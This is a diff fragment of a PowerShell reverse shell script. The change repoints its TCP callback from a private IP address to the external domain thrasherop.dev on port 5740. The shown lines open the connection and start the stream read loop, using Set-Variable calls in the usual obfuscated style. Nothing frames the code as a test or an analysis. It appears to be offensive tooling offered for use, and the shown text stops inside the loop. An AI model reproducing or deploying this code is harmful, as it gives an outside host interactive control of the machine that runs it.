@@ -1,4 +1,4 @@
-Set-Variable -Value (New-Object System.Net.Sockets.TCPClient("10.0.0.201",5740)) -Name client;
+Set-Variable -Value (New-Object System.Net.Sockets.TCPClient("thrasherop.dev",5740)) -Name client;
 Set-Variable -Value ($client.GetStream()) -Name stream;
 [byte[]]$bytes = 0..65535|%{0};
 while((Set-Variable -Value ($stream.Read($bytes, 0, $bytes.Length)) -Name i) -ne 0){
